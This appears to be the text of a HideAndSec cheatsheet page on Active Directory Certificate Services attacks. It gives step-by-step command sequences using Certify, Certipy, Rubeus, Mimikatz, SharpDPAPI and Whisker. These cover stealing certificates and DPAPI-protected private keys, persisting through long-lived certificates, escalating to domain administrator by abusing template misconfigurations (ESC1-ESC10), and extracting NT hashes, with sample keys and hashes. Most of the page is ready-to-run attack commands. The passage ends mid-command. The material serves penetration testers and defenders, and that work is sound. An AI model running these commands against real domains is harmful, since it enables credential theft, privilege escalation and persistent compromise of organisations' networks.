title = "Active Directory Certi... | HideAndSec"
description = "It is a cheatsheet about the different AD-CS attacks presented by SpecterOps. All the references and..."
full_description = "Active Directory Certificate Services It is a cheatsheet about the different AD-CS attacks presented by SpecterOps. All the references and resources for the commands and techniques will be listed at the end of the page, for acknowledgments and explains. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter @BlWasp_. I will try to put as many links as possible at the end of the page to direct to more complete resources. Many commands are more explained here, where I have participate for AD-CS. Is there a CA ? Find the Cert Publishers group : From UNIX-like systems: rpc net group members \"Cert Publishers\" -U \"DOMAIN\"/\"User\"%\"Password\" -S \"DomainController\" From Windows systems: net group \"Cert Publishers\" /domain Find the PKI and enumerate the templates and configurations from Linux: netexec ldap 'domaincontroller' -d 'contoso' -u 'user' -p 'password' -M adcs certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' Find the CA from Windows: certutil -config - -ping Certify.exe cas Certify.exe find Enumerate the HTTP ports on the servers, enumerate the shares to find CertEnroll, etc. Certificate Theft Export user certificates with Crypto APIs - THEFT1 With a session on a machine as a user, it is possible to export his certificate from the Windows Certificate Manager. With an interactive session and if the private keys are exportable : certmgr.msc -> All Tasks → Export... to export a password protected .pfx file. With PowerShell : $mypwd = ConvertTo-SecureString -String \"Password123!\" -Force -AsPlainText Export-PfxCertificate -Cert cert:\\currentuser\\my\\<CERT_THUMBPRINT> -FilePath ./export.pfx -Password $mypwd #Or with CertStealer #List all certs CertStealer.exe --list #Export a cert in pfx CertStealer.exe --export pfx <CERT_THUMBPRINT> If the CAPI or CNG APIs are configured to block the private key export, they can be patched with Mimikatz : mimikatz # crypto::capi privilege::debug crypto::cng crypto::certificates /export Certificate theft via DPAPI - THEFT2 & 3 User certificates With the master key : #With SharpDPAPI SharpDPAPI.exe certificates /mkfile:key.txt #With Mimikatz #Export certificate and its public key to DER cd C:\\users\\user1\\appdata\\roaming\\microsoft\\systemcertificates\\my\\certificates\\ ./mimikatz.exe \"crypto::system /file:43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8 /export\" Key Container : te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab #Find the master key (test them all until you find the good one) ./mimikatz.exe \"dpapi::capi /in:ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad\" pUniqueName : te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab #->good one guidMasterKey : {f216eabc-73af-45dc-936b-babe7ca8ed05} #Decrypt the master key ./mimikatz.exe \"dpapi::masterkey /in:f216eabc-73af-45dc-936b-babe7ca8ed05 /rpc\" exit key : 40fcaaf0f3d80955bd6b4a57ba5a3c6cd21e5728bcdfa5a4606e1bf0a452d74ddb4e222b71c1c3be08cb4f337f32e6250576a2d105d30ff7164978280180567e sha1: 81a2357b28e004f3df2f7c29588fbd8d650f5e70 #Decrypt the private key ./mimikatz.exe \"dpapi::capi /in:\\\"Crypto\\RSA\\<user_SID>\\ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad\\\" /masterkey:81a2357b28e004f3df2f7c29588fbd8d650f5e70\" exit Private export : OK - 'dpapi_private_key.pvk' #Build PFX certificate openssl x509 -inform DER -outform PEM -in 43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8.der -out public.pem openssl rsa -inform PVK -outform PEM -in dpapi_private_key.pvk -out private.pem openssl pkcs12 -in public.pem -inkey private.pem -password pass:bar -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx With a domain backup key to first decrypt all possible master keys : SharpDPAPI.exe certificates /pvk:key.pvk Machine certificates Same, but in a elevated context : SharpDPAPI.exe certificates /machine To convert a PEM file to a PFX : openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx Finding certificate files - THEFT4 To search for possibly certificate and key related files with Seatbelt : ./Seatbelt.exe \"dir C:\\ 10 \\.(pfx|pem|p12)`$ false\" ./Seatbelt.exe InterestingFiles Other interesting extensions : .key : Contains just the private key .crt/.cer : Contains just the certificate .csr : Certificate signing request file. This does not contain certificates or keys .jks/.keystore/.keys : Java Keystore. May contain certs + private keys used by Java applications To find what the certificate can do : $CertPath = \".\\cert.pfx\" $CertPass = \"Password123!\" $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass) $Cert.EnhancedKeyUsageList #Or with a pfx certutil.exe -dump -v cert.pfx Verify if a found certificate is the CA certificate (you are really lucky) : #Show certificate thumbprint $CertPath = \".\\cert.pfx\" $CertPass = \"Password123!\" $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass) $Cert.Thumbprint #Verify CA thumbprint certutil.exe find /quiet If they match, it's good. NTLM Credential Theft via PKINIT – THEFT5 When a TGT is requested with PKINIT, the LM:NT hash is added in the structure PAC_CREDENTIAL_INFO for futur use if Kerberos is not supported, and the PAC is ciphered with the krbtgt key. When a TGS is requested from the TGT, the same structure is added, but ciphered with the session key. The structure can be unciphered if a TGS-REQ U2U is realised. It's called UnPac-the-hash. Windows Rubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show Linux # Authenticate and recover the NT hash certipy auth -pfx 'user.pfx' -no-save Account Persistence User account persistence - PERSIST1 With a user account control on a domain machine, if a template that allows Client Authentication is enabled, it is possible to request a certificate that will be valid for the lifetime specified in the template even if the user changes his password. Windows Certify.exe request /ca:CA.contoso.local\\CA /template:\"Authentication Template\" Linux If the user's password is known: certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Authentication Template' Machine account persistence - PERSIST2 With a machine account control, if a template that allows Client Authentication is enabled for the computers, it is possible to request a certificate that will be valid for the lifetime specified in the template even a password modification, a system wipe or whatever (if the machine hostname remains the same). Windows Certify.exe request /ca:CA.contoso.local\\CA /template:\"Authentication Template\" /machine Linux If the machine's hash is known: certipy req -u 'machine@contoso.local' -hashes ':<hash_NT>' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Authentication Template' Account persistence via Certificate Renewal - PERSIST3 The renewal period of a template indicates the timeframe before the certificate expiration where the user can manually renew his certificate. The attacker, however, can renew the certificate before expiration. This can function as an extended persistence approach that prevents additional ticket enrollments from being requested, which can leave artifacts on the CA server itself. Domain Privesc Template Attacks - ESC1, 2, 3, 9, 10, 13, 14, 15 ESC1 : SAN authorized & Low Privileged Users can enroll & Authentication EKU ESC2 : Low Privileged Users can enroll & Any or No EKU ESC3 : Certificate Request Agent EKU & Enrollment agent restrictions are not implemented on the CA A template allows a low-privileged user to use an enrollment agent certificate. Another template allows a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication. Template misconfiguration - ESC1, 2 & 3 Windows ESC1 & 2 # Find vulnerable/abusable certificate templates using default low-privileged group Certify.exe find /vulnerable # Find vulnerable/abusable certificate templates using all groups the current user context is a part of: Certify.exe find /vulnerable /currentuser # Request certificate with SAN Certify.exe request /ca:CA.contoso.local\\CA /template:\"Vulnerable template\" /altname:\"admin\" # Convert PEM to PFX (from Linux) openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out admin.pfx If ANY EKU but no Client Authentication, it can be used as en ESC3. ESC2 & 3 # Request an enrollment agent certificate Certify.exe request /ca:CA.contoso.local\\CA /template:Vuln-EnrollAgentTemplate # Request a certificate on behalf of another to a template that allow for domain authentication Certify.exe request /ca:CA.contoso.local\\CA /template:User /onbehalfon:CONTOSO\\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd! Linux ESC1 & 2 # enumerate and save text, json and bloodhound (original) outputs certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -old-bloodhound # quickly spot vulnerable elements certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout #To specify a user account in the SAN certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'administrator@contoso.local' #To specify a computer account in the SAN certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.contoso.local' If ANY EKU but no Client Authentication, it can be used as en ESC3. ESC2 & 3 # Request a certificate specifying the Certificate Request Agent EKU certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' # Used issued certificate to request another certificate on behalf of another user certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\domain admin' -pfx 'user.pfx' Extension misconfiguration - ESC9 & 10 ESC9 : No security extension, the certificate attribute msPKI-Enrollment-Flag contains the flag CT_FLAG_NO_SECURITY_EXTENSION StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag (0x4) The template contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value The template specifies client authentication GenericWrite right against any account A to compromise any account B ESC10 : Weak certificate mapping Case 1 : StrongCertificateBindingEnforcement set to 0, meaning no strong mapping is performed A template that specifiy client authentication is enabled GenericWrite right against any account A to compromise any account B Case 2 : CertificateMappingMethods is set to 0x4, meaning no strong mapping is performed and only the UPN will be checked A template that specifiy client authentication is enabled GenericWrite right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example) Windows ESC9 Here, user1 has GenericWrite against user2 and want to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value. #Retrieve user2 creds via Shadow Credentials Whisker.exe add /target:\"user2\" /domain:\"contoso.local\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\" #Change user2 UPN to user3 Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose #Request vulnerable certif with user2 Certify.exe request /ca:CA.contoso.local\\CA /template:\"Vulnerable template\" #user2 UPN change back Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose #Authenticate with the certif and obtain user3 hash during UnPac the hash Rubeus.exe asktgt /getcredentials /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"contoso.local\" /dc:\"DOMAIN_CONTROLLER\" /show ESC10 - Case 1 Here, user1 has GenericWrite against user2 and want to compromise user3. #Retrieve user2 creds via Shadow Credentials Whisker.exe add /target:\"user2\" /domain:\"contoso.local\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\" #Change user2 UPN to user3 Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose #Request authentication certif with user2 Certify.exe request /ca:CA.contoso.local\\CA /template:\"User\" #user2 UPN change back Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose #Authenticate with the certif and obtain user3 hash during UnPac the hash Rubeus.exe asktgt /getcredentials /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"contoso.local\" /dc:\"DOMAIN_CONTROLLER\" /show ESC10 - Case 2 Here, user1 has GenericWrite against user2 and want to compromise the domain controller DC$@contoso.local. #Retrieve user2 creds via Shadow Credentials Whisker.exe add /target:\"user2\" /domain:\"contoso.local\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\" #Change user2 UPN to DC$@contoso.local Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@contoso.local'} -Verbose #Request authentication certif with user2 Certify.exe request /ca:CA.contoso.local\\CA /template:\"User\" #user2 UPN change back Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose Now, authentication with the obtained certificate will be performed through Schannel. It can be used to perform, for example, an RBCD. Linux ESC9 Here, user1 has GenericWrite against user2 and want to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value. #Retrieve user2 creds via Shadow Credentials certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2 #Change user2 UPN to user3 certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user3@contoso.local #Request vulnerable certif with user2 certipy req -username 'user2@contoso.local' -hash 'hash_value' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' #user2 UPN change back certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local #Authenticate with the certif and obtain user3 hash during UnPac the hash certipy auth -pfx 'user3.pfx' -domain 'contoso.local' ESC10 - Case 1 Here, user1 has GenericWrite against user2 and want to compromise user3. #Retrieve user2 creds via Shadow Credentials certipy shadow auto -username 'user1@contoso.local' -p 'password'"
